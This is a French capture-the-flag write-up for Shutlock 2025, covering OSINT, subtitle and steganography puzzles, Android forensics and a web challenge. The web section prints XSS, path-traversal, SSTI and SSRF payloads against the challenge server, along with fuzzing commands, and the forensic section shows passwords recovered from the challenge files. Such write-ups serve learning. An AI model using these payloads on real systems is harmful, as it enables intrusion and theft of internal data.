

<!DOCTYPE html>
<html class="writer-html5" lang="fr" data-content_root="../../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Histoire &mdash; Documentation Kubow WU 1</title>
      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />

  
      <script src="../../_static/jquery.js?v=5d32c60e"></script>
      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../../_static/documentation_options.js?v=a12a2fe1"></script>
      <script src="../../_static/doctools.js?v=9bcbadda"></script>
      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
      <script src="../../_static/translations.js?v=e6b791cb"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Recherche" href="../../search.html" />
    <link rel="next" title="Form Avility" href="formavility.html" />
    <link rel="prev" title="Shutlock 2025" href="_index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../index.html" class="icon icon-home">
            Kubow WU
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Rechercher docs" aria-label="Rechercher docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Liste des CTFs :</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2024/_index.html">Midnight Flag 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2025/_index.html">Midnight Flag 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../404ctf-2024/_index.html">404CTF 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../404ctf-2025/_index.html">404CTF 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../HTB-Apocalypse-2025/_index.html">HTB Apocalypse 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../FCSC-2025/_index.html">FCSC 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../DGSE-Root-Me-2025/_index.html">DGSE Root-Me 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Hackosint-2025/_index.html">Hackosint 2025</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="_index.html">Shutlock 2025</a><ul class="current">
<li class="toctree-l2 current"><a class="reference internal" href="_index.html#story">Story</a><ul class="current">
<li class="toctree-l3 current"><a class="current reference internal" href="#">Histoire</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#osint-un-pingouin-dans-une-botte-de-foin">OSINT : Un pingouin dans une botte de foin</a></li>
<li class="toctree-l4"><a class="reference internal" href="#forensic-le-generique-de-trop">Forensic - Le Générique de Trop</a></li>
<li class="toctree-l4"><a class="reference internal" href="#web-real-be">Web - Real Be</a></li>
<li class="toctree-l4"><a class="reference internal" href="#osint-find-the-lab">Osint - Find The Lab</a></li>
<li class="toctree-l4"><a class="reference internal" href="#misc-affiche-etrange">Misc - Affiche Etrange</a></li>
<li class="toctree-l4"><a class="reference internal" href="#forensic-un-cadavre-peut-en-cacher-un-autre">Forensic - Un cadavre peut en cacher un autre</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="_index.html#web">Web</a></li>
<li class="toctree-l2"><a class="reference internal" href="_index.html#osint">Osint</a></li>
<li class="toctree-l2"><a class="reference internal" href="_index.html#forensic">Forensic</a></li>
</ul>
</li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Kubow WU</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="_index.html">Shutlock 2025</a></li>
      <li class="breadcrumb-item active">Histoire</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/ctf/shutlock-2025/story.rst.txt" rel="nofollow"> Afficher la source de la page</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="histoire">
<h1>Histoire<a class="headerlink" href="#histoire" title="Lien vers cette rubrique"></a></h1>
<section id="osint-un-pingouin-dans-une-botte-de-foin">
<h2>OSINT : Un pingouin dans une botte de foin<a class="headerlink" href="#osint-un-pingouin-dans-une-botte-de-foin" title="Lien vers cette rubrique"></a></h2>
<p>On cherche des infos sur Line Huks,</p>
<p>Avec IDCRAWL on trouve rapidement son twitter : <a class="reference external" href="https://x.com/LineHuks/with_replies">https://x.com/LineHuks/with_replies</a></p>
<p>Puis avec « LineHuks » on trouve également :</p>
<ul class="simple">
<li><p>Blueskye : <a class="reference external" href="https://bsky.app/profile/linehuks.bsky.social">https://bsky.app/profile/linehuks.bsky.social</a></p></li>
<li><p>Reddit : <a class="reference external" href="https://www.reddit.com/user/LineHuks/">https://www.reddit.com/user/LineHuks/</a></p></li>
</ul>
<p>Sur Reddit elle explique qu’on peut voir qui nous a partage une vidéo sur tiktok si on est sur mobile ou avec un user agent mobile</p>
<p>On passe donc chrome en mode mobile et on visite son lien tiktok posté sur blueskye : vm.tiktok.com/ZNdjwpCF4/</p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/shutlock_1.png"><img alt="Compte Tiktok" src="../../_images/shutlock_1.png" style="width: 1200px;" />
</a>
</figure>
<p>On retrouve alors son compte Tiktok et ses publications.</p>
<p>Dans l’une d’elle on peut retrouver le flag : <a class="reference external" href="https://www.tiktok.com/&#64;lestudiodutux/video/7500242847291968790">https://www.tiktok.com/&#64;lestudiodutux/video/7500242847291968790</a></p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/shutlock_2.png"><img alt="Compte Tiktok" src="../../_images/shutlock_2.png" style="width: 1200px;" />
</a>
</figure>
<p>On a donc notre flag : <strong>SHLK{LABO_FOR4_CO5P}</strong></p>
</section>
<section id="forensic-le-generique-de-trop">
<h2>Forensic - Le Générique de Trop<a class="headerlink" href="#forensic-le-generique-de-trop" title="Lien vers cette rubrique"></a></h2>
<p>On a plusieurs fichiers XML, dont un avec les sous titres du finalement</p>
<p>Dedans on retrouve ceci :</p>
<div class="highlight-XML notranslate"><div class="highlight"><pre><span></span><span class="nt">&lt;Subtitle&gt;</span>
<span class="nt">&lt;Start&gt;</span>00:00:48,500<span class="nt">&lt;/Start&gt;</span>
<span class="nt">&lt;End&gt;</span>00:00:48,500<span class="nt">&lt;/End&gt;</span>
<span class="nt">&lt;Text&gt;</span>Dans<span class="w"> </span>Ce<span class="w"> </span>Pays,<span class="w"> </span>Hélas,<span class="w"> </span>malgré<span class="w"> </span>le<span class="w"> </span>fort<span class="w"> </span>potentiel<span class="w"> </span>qu&#39;il<span class="w"> </span>A,<span class="w"> </span>C&#39;est<span class="w"> </span>une<span class="w"> </span>période<span class="w"> </span>sombre<span class="w"> </span>:<span class="w"> </span>il<span class="w"> </span>subit<span class="w"> </span>un<span class="w"> </span>Krack<span class="w"> </span>Économique<span class="w"> </span>Dramatique.<span class="nt">&lt;/Text&gt;</span>
<span class="nt">&lt;/Subtitle&gt;</span>
</pre></div>
</div>
<p>Il y a des majuscules un peu partout, si on ne garde que les majuscules on obtient DCPHACKED</p>
<p>On test au cas ou, c’est bien notre flag : <strong>SHLK{DCPHACKED}</strong></p>
</section>
<section id="web-real-be">
<h2>Web - Real Be<a class="headerlink" href="#web-real-be" title="Lien vers cette rubrique"></a></h2>
<p>On commence l’étape 2 avec le web</p>
<p>Le formulaire nous emmène sur cette url : <a class="reference external" href="http://57.128.112.118:11658/get_url.php?video=a&amp;director=b&amp;email=a%40a.fr">http://57.128.112.118:11658/get_url.php?video=a&amp;director=b&amp;email=a%40a.fr</a></p>
<p>On trouve rapidement une injection html et une xss dans le paramètre « video » :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">http://57.128.112.118:11658/get_url.php?video=&lt;h1&gt;test&amp;director=b&amp;email=a%</span>40a.fr
<span class="go">http://57.128.112.118:11658/get_url.php?video=&lt;img src=x onerror=&#39;alert(1)&#39;&gt;&amp;director=b&amp;email=a%40a.fr</span>
</pre></div>
</div>
<p>Mais a priori rien à en faire directement.</p>
<p>On se pose la question de la SSTI mais la page n’a aucun template.</p>
<p>On cherche plutôt un fichier en faites</p>
<p>Si on se rend sur <a class="reference external" href="http://57.128.112.118:11658/get_url.php">http://57.128.112.118:11658/get_url.php</a></p>
<p>On obtient « Pas d’url ou de route donnée »</p>
<p>En ajoutant email ou director en paramètre, la page ne change pas, donc seul le paramètre video est utile.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://57.128.112.118:12116/get_url.php?video[1]=1</span>
<span class="go">==&gt; Erreur avec emplacement du fichier /var/www/html/get_url.php</span>

<span class="go">http://57.128.112.118:11658/get_url.php?video=....//....//</span>
<span class="go">==&gt; Film « .... » introuvable.</span>
<span class="go">==&gt; filtre sur ../ ?</span>

<span class="go">http://57.128.112.118:11658/get_url.php?video=..\..\..\..\..\etc\passwd</span>
<span class="go">==&gt; Film « ..\..\..\..\..\etc\passwd » introuvable.</span>

<span class="go">http://57.128.112.118:11658/get_url.php?video=...//a</span>
<span class="go">==&gt; Film « a » introuvable.</span>
</pre></div>
</div>
<p>On sait également que c’est du PHP, donc peut être un wrapper php ? Non</p>
<p>On a demandé de l’aide, en faites il faut déjà commencé par obtenir un film valide, et notamment « L is Dead » : <a class="reference external" href="http://57.128.112.118:11531/get_url.php?video=L+is+Dead">http://57.128.112.118:11531/get_url.php?video=L+is+Dead</a></p>
<p>Ensuite on a un formulaire de commentaire, on test tout de suite {{7*7}} et on obtient 49.</p>
<p>Donc c’est une SSTI, et dans le code de la page on a :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&lt;!-- service interne : invisible_server --&gt;</span>
</pre></div>
</div>
<p>On va donc essayer de contacter ce serveur avec la SSTI :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">{{include(&quot;index.html&quot;)}}</span>
<span class="go">{{include(&quot;https://invisible_server&quot;)}} ==&gt; allow_url_include==O donc https désactivé, pareil avec http</span>
<span class="go">{{file_get_contents(&#39;http://invisible_server/&#39;)}} ==&gt; 403</span>
<span class="go">{{file_get_contents(&#39;https://invisible_server/&#39;)}} ==&gt; Connection refused</span>
<span class="go">{{fopen(&quot;http://invisible_server/&quot;, &quot;r&quot;);}} ==&gt; 403</span>
<span class="go">{{print_r(get_headers(&quot;http://invisible_server/&quot;, 1))}} ==&gt; Array ( [0] =&gt; HTTP/1.1 403 Forbidden [Date] =&gt; Thu, 26 Jun2025 15:46:19 GMT [Server] =&gt; Apache/2.4.62 (Debian) [Content-Length] =&gt; 281 [Connection] =&gt; close [Content-Type] =&gt; text/html; charset=iso-8859-1 )</span>
<span class="go">{{ curl_exec(curl_init(&quot;http://invisible_server/&quot;)) }} ==&gt; 403 mais affiche la page</span>
<span class="go">{{fopen(&quot;http://invisible_server/%20/&quot;, &quot;r&quot;);}} ==&gt; Resource id #3</span>
<span class="go">{{print_r(get_headers(&quot;http://invisible_server/%20/&quot;, 1))}} ==&gt; Array ( [0] =&gt; HTTP/1.1 200 OK [Date] =&gt; Thu, 26 Jun2025 16:16:06 GMT [Server] =&gt; Apache/2.4.62 (Debian) [X-Powered-By] =&gt; PHP/8.2.28 [Content-Length] =&gt; 60 [Connection] =&gt; close [Content-Type] =&gt; text/html; charset=UTF-8 )</span>

<span class="go">{{ curl_exec(curl_init(&quot;http://invisible_server/%20/&quot;)) }} ==&gt; La route demandée n’est pas correcte ou est indisponible</span>


<span class="go">{{ curl_setopt($c = curl_init(&quot;http://invisible_server/%20/&quot;), CURLOPT_CUSTOMREQUEST, &quot;POST&quot;); curl_setopt($c, CURLOPT_RETURNTRANSFER, true);curl_exec($c); }}</span>
</pre></div>
</div>
<p>Finalement on part sur du fuzzing plutot que 403 bypass :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ffuf -w doc/_static/files_to_download/wordlists/raft-medium-directories.txt -u &quot;http://57.128.112.118:13003/get_url.php?video=L+is+Dead&amp;comment=%7B%7B+curl_exec%28curl_init%28%22http%3A%2F%2Finvisible_server%2FFUZZ%22%29%29+%7D%7D&quot; -fs 2096</span>
<span class="go">/interne/</span>
</pre></div>
</div>
<p>On obtient ceci :</p>
<p>« Bien joué ! Tu es arrivé sur le serveur secret !
Maintenant tu peux tenter de lister les ressources accessibles »</p>
<p>On va donc continuer le fuzzing jusqu’à trouve /interne/flag</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Tu viens de mettre la main sur des infos confidentielles, utiles pour la suite du challenge.</span>
<span class="go">Le but reste de vérifier que les noms donnés dans les crédits ne divulguent pas ceux des agents du ministère.</span>
<span class="go">Bon courage pour la deuxième partie du challenge.</span>
<span class="go">webapp</span>
<span class="go">├── app</span>
<span class="go">│ ├── todo.txt</span>
<span class="go">│ └── webroot</span>
<span class="go">│ └── index.html</span>
<span class="go">└── static</span>
<span class="go">├── capybara_detective.png</span>
<span class="go">├── snoopy_in_a_lab.png</span>
<span class="go">├── L-is-dead.mp4</span>
<span class="go">└── L-is-dead_DGSI.mp4.mp4</span>
<span class="go">Lien vers le dossier des vidéos : http://57.128.85.25:50014/</span>
</pre></div>
</div>
<p>Bon je savais pas trop quoi faire avec les .mp4, jme suis fait bait par la description</p>
<p>Il faut accéder au fichier todo.txt, on est sur un serveur nginx, ça sent la misconfig !</p>
<p>On fait : <a class="reference external" href="http://57.128.85.25:50014/static../app/todo.txt">http://57.128.85.25:50014/static../app/todo.txt</a></p>
<p>Et on obtient notre flag : <strong>SHLK{ssrf_f0und_th3_h1dd3n_p4th}</strong></p>
</section>
<section id="osint-find-the-lab">
<h2>Osint - Find The Lab<a class="headerlink" href="#osint-find-the-lab" title="Lien vers cette rubrique"></a></h2>
<p>Il faut retrouver le lieu de la photo prise :</p>
<figure class="align-center">
<a class="reference internal image-reference" href="_static/img/shutlock2025/lab.png"><img alt="ALEAPP" src="_static/img/shutlock2025/lab.png" style="width: 1200px;" />
</a>
</figure>
</section>
<section id="misc-affiche-etrange">
<h2>Misc - Affiche Etrange<a class="headerlink" href="#misc-affiche-etrange" title="Lien vers cette rubrique"></a></h2>
<p>En inspectant un peu l’image, j’ai vraiment l’impression qu’il y a quelque chose qui tient de la stegano, du type lastBuildDate</p>
<p>On va commencer par ce site :</p>
<p>On sait maintenant que le résultat de l’extration LSB est une image, mais pas possible de la récupérer via le site.</p>
<p>Donc on va faire un script :</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="n">PNG_SIGNATURE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89</span><span class="s1">PNG</span><span class="se">\r\n\x1a\n</span><span class="s1">&#39;</span>

<span class="k">def</span> <span class="nf">extract_lsb_stream</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="n">channels</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Extrait les bits LSB d&#39;une image selon les canaux spécifiés, retourne un flux binaire.&quot;&quot;&quot;</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="s2">&quot;RGB&quot;</span><span class="p">)</span>
    <span class="n">pixels</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">img</span><span class="o">.</span><span class="n">getdata</span><span class="p">())</span>

    <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">pixel</span> <span class="ow">in</span> <span class="n">pixels</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">channel</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s2">&quot;RGB&quot;</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">channel</span> <span class="ow">in</span> <span class="n">channels</span><span class="p">:</span>
                <span class="n">bitstream</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">pixel</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">))</span>

    <span class="c1"># Regrouper les bits en octets</span>
    <span class="n">bytes_out</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte_bits</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_bits</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">byte_bits</span><span class="p">:</span>
            <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">bit</span>
        <span class="n">bytes_out</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">bytes_out</span>

<span class="k">def</span> <span class="nf">try_extract_png</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="n">output_prefix</span><span class="o">=</span><span class="s2">&quot;extracted&quot;</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Teste toutes les combinaisons de canaux pour retrouver un fichier PNG&quot;&quot;&quot;</span>
    <span class="n">combinations</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>  <span class="c1"># R, RG, RGB</span>
        <span class="n">combinations</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">combinations</span><span class="p">(</span><span class="s2">&quot;RGB&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">:</span>
        <span class="n">combo_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">combo</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] Test combo: </span><span class="si">{</span><span class="n">combo_str</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">extract_lsb_stream</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="n">combo_str</span><span class="p">)</span>

        <span class="n">sig_index</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">PNG_SIGNATURE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">sig_index</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] PNG signature trouvée avec </span><span class="si">{</span><span class="n">combo_str</span><span class="si">}</span><span class="s2"> à l’offset </span><span class="si">{</span><span class="n">sig_index</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">png_data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">sig_index</span><span class="p">:]</span>

            <span class="n">output_file</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">output_prefix</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">combo_str</span><span class="si">}</span><span class="s2">.png&quot;</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">png_data</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✓] Fichier image extrait : </span><span class="si">{</span><span class="n">output_file</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">output_file</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Aucun fichier PNG détecté.&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">None</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">try_extract_png</span><span class="p">(</span><span class="s2">&quot;the_da_vinci_code.png&quot;</span><span class="p">)</span>
</pre></div>
</div>
<p>On obtient alors une image qui dit : RENDEZ VOUS 24H ICI spszzm8m8 Ne soyez pas en retard.</p>
<p>On a donc un code qui détermine un lieu, peut être un mapcode ? A priori non</p>
<p>Ni un Plus Code.</p>
<p>Qu’est ce qu’il reste ? GeoHash (Merci GPT j’avoue)!! <a class="reference external" href="https://www.movable-type.co.uk/scripts/geohash.html">https://www.movable-type.co.uk/scripts/geohash.html</a></p>
<p>On saisit le code : spszzm8m8</p>
<p>Et on trouve le casino : <strong>SHLK{casino_barriere_le_croisette}</strong></p>
</section>
<section id="forensic-un-cadavre-peut-en-cacher-un-autre">
<h2>Forensic - Un cadavre peut en cacher un autre<a class="headerlink" href="#forensic-un-cadavre-peut-en-cacher-un-autre" title="Lien vers cette rubrique"></a></h2>
<p>On nous donne un dossier compressé contenant les fichiers d’un téléphone portable</p>
<p>Avec ls -laR donc en récursif, on trouve rapidement un fichier nommé mes-données.kdbx</p>
<p>Donc une archive Keepass, mais ou trouver le mot de passe ?</p>
<p>On va utiliser ALEAPP <a class="reference external" href="https://github.com/abrignoni/ALEAPP">https://github.com/abrignoni/ALEAPP</a></p>
<p>Celui ci va nous pondre un petit rapport bien sympas !</p>
<p>Dans la partie Google Message on va trouver ceci :</p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/aleapp.png"><img alt="ALEAPP" src="../../_images/aleapp.png" style="width: 1200px;" />
</a>
</figure>
<p>On obtient alors cette clé qui nous permet d’ouvrir le Keepass :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">e,PY\;J{XKp!4.M4z1}7</span>
</pre></div>
</div>
<p>Pour info on le trouve aussi ici dans l’image :</p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/aleapp2.png"><img alt="ALEAPP" src="../../_images/aleapp2.png" style="width: 1200px;" />
</a>
</figure>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/aleapp3.jpg"><img alt="ALEAPP" src="../../_images/aleapp3.jpg" style="width: 1200px;" />
</a>
</figure>
<p>Dedans on trouve un compte :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">perso:KwiLTYldD6g1WNW6pcFD</span>
</pre></div>
</div>
<p>Mais ce n’est pas le flag, alors que faire ?</p>
<p>On peut voir qu’il y a des fichiers « attachments » dans le keepass sur l’entrée.</p>
<p>On va les récupérer :</p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/boardpass.png"><img alt="BoardPass" src="../../_images/boardpass.png" style="width: 1200px;" />
</a>
</figure>
<p>On a son identité, mais a priori ce n’est pas le flag.</p>
<p>Finalement on trouve notre flag :</p>
<figure class="align-center">
<a class="reference internal image-reference" href="../../_images/idcard.png"><img alt="ID Card" src="../../_images/idcard.png" style="width: 1200px;" />
</a>
</figure>
<p>Flag : <strong>SHLK{OHL3S4LK4F4R}</strong></p>
<p>Et on ira pas plus loin parce que crypto et pwn hard, et bah tant pis haha !</p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
        <a href="_index.html" class="btn btn-neutral float-left" title="Shutlock 2025" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
        <a href="formavility.html" class="btn btn-neutral float-right" title="Form Avility" accesskey="n" rel="next">Suivant <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Droits d'auteur 2025, Kubow.</p>
  </div>

  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>